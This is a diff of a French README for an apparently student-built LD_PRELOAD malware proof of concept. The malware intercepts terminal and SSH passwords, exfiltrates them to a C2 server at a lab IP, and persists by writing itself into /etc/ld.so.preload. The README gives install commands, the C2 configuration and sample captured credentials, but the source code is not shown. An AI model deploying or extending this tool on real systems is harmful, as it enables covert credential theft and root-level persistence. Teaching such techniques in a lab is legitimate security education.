@@ -1,14 +1,34 @@
-## Auteur
-- Angelov Onur et Slimani Anis — ESGI 3SIJ
-# README - Malware LD_PRELOAD avec Serveur C2 et Base de Données en C (B-Tree)
+# 🐍 Projet Malware LD_PRELOAD + Serveur C2 avec Base B-Tree (ESGI 3SIJ)
 
-Ce projet est un POC complet d’un malware basé sur `LD_PRELOAD`, capable d’intercepter les identifiants SSH d’un utilisateur, de les envoyer à un serveur distant C2, et de les stocker de manière persistante dans une base de données implémentée en C à l’aide d’un B-Tree.
+## 👥 Auteurs
 
-Pour commencer : ``git clone https://github.com/Runo76/CC1-DATABASE-ESGI``
+- **Angelov Onur**
+- **Slimani Anis**
+
 ---
+
+## 🧠 Description du projet
+
+Ce projet est une preuve de concept (POC) de malware utilisant la technique `LD_PRELOAD`. Il permet :
+
+- l’interception de mots de passe saisis dans le terminal (ex : SSH),
+- l’exfiltration vers un serveur distant C2,
+- l’enregistrement persistant dans une base de données en **C** utilisant une structure en **B-Tree**.
+
+---
+
+## 🚀 Clonage du projet
+
+```bash
+git clone https://github.com/Runo76/CC1-DATABASE-ESGI
+cd CC1-DATABASE-ESGI
 ```
+
+---
+
 ## 📁 Structure du projet
 
+```text
 CC1-DATABASE-ESGI/
 ├── server/                    # Serveur C2 (écoute, enregistre les victimes)
 │   ├── server.c
@@ -23,7 +43,7 @@ CC1-DATABASE-ESGI/
 │   ├── persistence.c/.h/.o
 │   ├── main.c/.o
 │   ├── database.db           # Fichier de base de données persistante
-│   ├── id_counter.txt        # Fichier de compteur ID auto-incrémenté
+│   ├── id_counter.txt        # Compteur ID auto-incrémenté
 │   ├── db.txt, db/, tests/   # Données et tests
 │   ├── Makefile, README.md
 │   └── BTreeProject/
@@ -32,7 +52,7 @@ CC1-DATABASE-ESGI/
 │   ├── send_to_c2.c
 │   ├── malware.so            # Généré après compilation
 │   ├── Makefile
-│   └── install_ldso_preload.sh  # Script pour activer automatiquement LD_PRELOAD
+│   └── add_to_ldso.sh        # Script pour activer automatiquement LD_PRELOAD
 └── README.md
 ```
 
@@ -42,106 +62,166 @@ CC1-DATABASE-ESGI/
 
 ### 🛠️ Prérequis
 
-- OpenSSH installé :
+Installer le serveur SSH :
 
-  sudo apt install openssh-server |
-  sudo nano /etc/ssh/sshd_config |
-  ### Modifier: Port 5555
-  sudo systemctl enable ssh |
-  |sudo systemctl start ssh
-🔧 Compilation du serveur + base
-______________________
-Terminal 2 cd ../BTreeDB :
-|make clean | make
-______________________
-Terminal 1 cd ~/server/CC1-DATABASE-ESGI/server:
-|make clean
-|make
-🚀 Lancer le serveur C2
-
-./server |
-Le serveur écoute sur le port 5555
-Il reçoit :
-
-register <hostname> <password> → stocké dans la base BTree
-
-log <hostname> <cmd> → affiché dans le terminal
-
-## 💻 VM 2 – Malware (192.168.1.15)
-🛠️ Prérequis
-OpenSSH installé :
-
+```bash
+sudo apt update
 sudo apt install openssh-server
-⚠️ Configuration du malware
-Dans send_to_c2.c, modifier l’IP du serveur (ligne #define C2_IP "...") :
+```
 
+Changer le port SSH (optionnel, exemple : `Port 5555`), puis redémarrer :
 
-#define C2_IP "192.168.1.20" |
-#define C2_PORT 5555 |
-Vous pouvez aussi modifier le port C2 si nécessaire.
+```bash
+sudo nano /etc/ssh/sshd_config
+sudo systemctl enable ssh
+sudo systemctl start ssh
+```
 
-🔧 Compilation
+### 🔧 Compilation du serveur et de la base
 
-cd ~/mal/CC1-DATABASE-ESGI/LD_PRELOAD/malware |
-___________
- make
-_______________________________
-chmod +x add_to_ldso.sh |
-sudo ./add_to_ldso.sh |
-______________________________
-Cela ajoute le chemin absolu de malware.so dans /etc/ld.so.preload
-🐚 Injection automatique via LD_PRELOAD
+**Terminal 1 – Compilation de la base BTree:**
 
-| Fonction                         | Description                                                                                                                                               |
-| -------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| 🔑 Exfiltration de mot de passe  | Intercepte les entrées `password:` dans un terminal                                                                                                       |
-| 📦 Envoi vers serveur C2         | Format : `register <hostname> <mdp>`                                                                                                                      |
-| 🚫 Blocage de fichiers sensibles: Empêche `open()` sur sudo /etc/passwd`, `/etc/shadow`, etc. Exemple : `sudo cat /etc/passwd` → Permission denied▪️ ` cat /etc/passwd` → aussi bloqué       |
-| 🧠 Injection automatique via SSH | Vous pouvez tester avec :<br>▪️ `LD_PRELOAD=./malware.so ssh name@192.168.1.xx`                                                                           |
-| 💾 Persistance dans BTree        | Chaque victime est stockée dans `database.db` avec ID unique                                                                                              |
-| 🔁 Injection persistante         | Automatique via `/etc/ld.so.preload`                                                                                   
+```bash
+cd BTreeDB
+make clean
+make
+```
 
-🔍 Vérification de la base
-Sur la VM C2 :
+**Terminal 2 – Compilation du serveur:**
 
-cd ../BTreeDB
+```bash
+cd server
+make clean
+make
+```
+
+### 🚀 Lancement du serveur C2
+
+```bash
+./server
+```
+
+Le serveur écoute sur le port `5555`. Il reçoit :
+
+- `register <hostname> <password>` → inséré dans la base
+- `log <hostname> <commande>` → affiché dans le terminal
+
+---
+
+## 💻 VM 2 – Malware LD_PRELOAD (192.168.1.15)
+
+### 🛠️ Prérequis
+
+```bash
+sudo apt update
+sudo apt install openssh-server
+```
+
+### ⚙️ Configuration du malware
+
+Dans le fichier `send_to_c2.c`, modifier :
+
+```c
+#define C2_IP "192.168.1.20"
+#define C2_PORT 5555
+```
+
+---
+
+### 🔧 Compilation et injection automatique
+
+```bash
+cd LD_PRELOAD/malware
+make
+chmod +x add_to_ldso.sh
+sudo ./add_to_ldso.sh
+```
+
+> Ce script ajoute le chemin absolu de `malware.so` dans `/etc/ld.so.preload`.
+
+---
+
+## 🐚 Fonctionnalités du malware
+
+| Fonction                        | Description                                                                                 |
+|---------------------------------|---------------------------------------------------------------------------------------------|
+| 🔑 Exfiltration de mot de passe | Intercepte les entrées `password:` dans un terminal                                         |
+| 📦 Envoi vers serveur C2        | Envoie les credentials avec : `register <hostname> <password>`                             |
+| 🚫 Blocage fichiers sensibles   | Bloque l'accès à `/etc/passwd`, `/etc/shadow` (via `open()`) même en `sudo`                |
+| 💾 Persistance en B-Tree        | Enregistrement dans `database.db` avec un ID unique                                         |
+| 🧠 Injection SSH testable       | Exemple : `LD_PRELOAD=./malware.so ssh user@192.168.1.xx`                                  |
+| 🔁 Injection automatique        | Ajout dans `/etc/ld.so.preload` pour persistance même après reboot                         |
+
+---
+
+## 📊 Vérification de la base (sur la VM C2)
+
+```bash
+cd BTreeDB
 ./db
-Dans la CLI :
+```
 
+Lancer la commande dans la CLI :
 
+```
 select
-Vous verrez (le register el le mdp de la connexion ssh):
-ex
+Autre commande disponible detaillé dans le README.md du dossier BTreeDB
+```
+
+> Résultat exemple :
+```
 (1, anisdebian, 1478)
 (2, onur, 1234)
+```
 
-🧪 Exemple de test
-Lancer le serveur C2 sur VM1 :
+---
+
+## 🧪 Exemple de test complet
+
+1. **Lancer le serveur sur la VM 1** :
+
+```bash
+(Après compilation db et server)
+cd server
 ./server
+```
 
+2. **Sur la VM 2 (malware)** :
 
-Sur la VM malware, compiler et injecter :
+```bash
+cd LD_PRELOAD/malware
+make
+chmod +x add_to_ldso.sh
+sudo ./add_to_ldso.sh
+```
 
+3. **Effectuer une commande avec mot de passe :**
 
-make |
-chmod +x add_to_ldso.sh|
-sudo ./add_to_ldso.sh |
-Se connecter à une machine distante via SSH (ou exécuter sudo ls)
-exemple : |
-LD_PRELOAD=./malware.so ssh nom@192.168.1.xx (ip)
+```bash
+LD_PRELOAD=./malware.so ssh user@192.168.1.xx
+```
 
+> Le mot de passe sera intercepté et envoyé au serveur.
 
-→ password: sera intercepté sur le serverc2
-Vérifier la base côté serveur :
+4. **Vérifier dans la base (VM1) :**
 
-cd ../BTreeDB
+```bash
+cd BTreeDB
 ./db
-> select (pour parcourir l'arbre et voir ceux qui est insert)
-autre commande expliqué dans la db
+> select
+```
 
+---
 
-❌ Pour désactiver le malware
+## ❌ Désactivation du malware
 
+```bash
 sudo rm /etc/ld.so.preload
-📎 Remarques
-Le fichier database.db est mis à jour automatiquement.
+```
+
+---
+
+## 📎 Remarques
+
+- Le fichier `database.db` est mis à jour automatiquement à chaque nouvelle victime.
+- Le projet fonctionne dans un environnement contrôlé (POC pédagogique).
